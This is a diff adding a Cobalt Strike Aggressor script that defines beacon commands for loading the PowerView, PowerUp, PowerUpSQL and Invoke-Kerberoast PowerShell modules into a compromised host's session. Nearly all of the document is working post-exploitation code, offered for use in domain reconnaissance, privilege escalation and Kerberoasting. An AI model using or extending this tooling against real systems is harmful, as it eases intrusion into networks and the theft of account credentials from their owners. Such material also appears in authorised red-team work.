@@ -1,0 +1,45 @@
+#### Load PowerShells
+## Aggressor script to simplify importing powershell scripts using powershll-import  
+###  Author: Sabri (@KINGSABRI)
+
+### Usage ###
+# 1. Modify/Add your script pathes in global variable section
+# 2. Import into Cobalt Strike
+# 3. From beacon try
+# 	beacon> load_powerview
+# 	beacon> load_powerup
+# 	beacon> load_powerupsql
+
+### Output ###
+#	powershell-import task gets exected
+
+### Global variables section
+global('$powerview_path $powerup_path $powerupsql_path $kerberoast_path');
+
+$powerview_path  = "/root/rt/post/PowerShell/PowerView3.ps1";
+$powerup_path    = "/root/rt/post/PowerShell/PowerUp.ps1";
+$powerupsql_path = "/root/rt/post/PowerShell/PowerUpSQL/PowerUpSQL.ps1";
+$kerberoast_path = "/root/rt/post/PowerShell/Invoke-Kerberoast.ps1";
+### 
+
+sub load_ps_script
+{
+  binput($1, "powershell_import $2");
+	bpowershell_import($1, $2);
+}
+
+alias load_powerview {
+	load_ps_script($1, $powerview_path);
+}
+
+alias load_powerup {
+	load_ps_script($1, $powerup_path);
+}
+
+alias load_powerupsql {
+	load_ps_script($1, $powerupsql_path);
+}
+
+alias load_kerberoast {
+	load_ps_script($1, $kerberoast_path);
+}
